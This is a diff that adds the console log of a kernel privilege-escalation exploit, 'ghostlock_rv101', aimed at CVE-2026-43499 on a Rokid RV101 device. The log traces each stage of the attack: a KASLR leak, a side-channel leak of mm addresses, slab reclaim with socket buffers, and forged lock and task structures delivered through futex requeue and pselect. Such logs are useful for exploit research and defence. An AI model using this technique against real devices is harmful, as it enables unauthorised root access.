@@ -1,0 +1,42 @@
+[+] ghostlock_rv101 v9.30 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
+[+] startup: pid=3096 uid=2000 euid=2000 gid=2000
+[*] [T+397438ms] KASLR leak
+[*] printk_formats: "Rescheduling interrupts" -> 0xffffffd63ba2ac0c slide=0x0000001631e00000
+[*] printk_formats: "Function call interrupts" -> 0xffffffd63baca100 slide=0x0000001631e00000
+[+] KASLR: slide=0x0000001631e00000 base=0xffffffd639e00000 (2 anchors)
+[*] FOPS install attempt 1/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 00000069bdd96478 (t=9556, ratio=1911)
+[*]   collision[2]: 00000069be7210d0 (t=9276, ratio=1855)
+[*]   collision[3]: 00000069be7d6678 (t=9681, ratio=1936)
+[*] kernelsnitch: top times: 9681 9556 9276 9 9 9 9 9
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=9571 mm=FOUND
+[*] kernelsnitch: elapsed 2236ms mm=ffffff8061a8da40
+[*] leaked mm=ffffff8061a8da40 slab base=ffffff8061a8c000
+[*] v9.14 settle[settle]: 39 rounds, o2=1111 objs=761 (quiet=20)
+[*] v9.10 gate: mm slabs 83 -> 82 objs 761 -> 650 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 26 -> 1979 across full sequence (gate window 83 -> 1979, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff8061a8d608 value=ffffff8061a8d500 mode=5 page=ffffff8061a8c000 fake_lock=ffffff8061a8ce00 fake_w0=ffffff8061a8d000 fake_task=ffffff8061a8d200 in=0000000000000000 out1=ffffff8061a8d600 out2=ffffffd63c7bcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8061a8d200 ex3=ffffff8061a8ce00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=9068
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=9068
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=9068
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=9068
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=9068
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
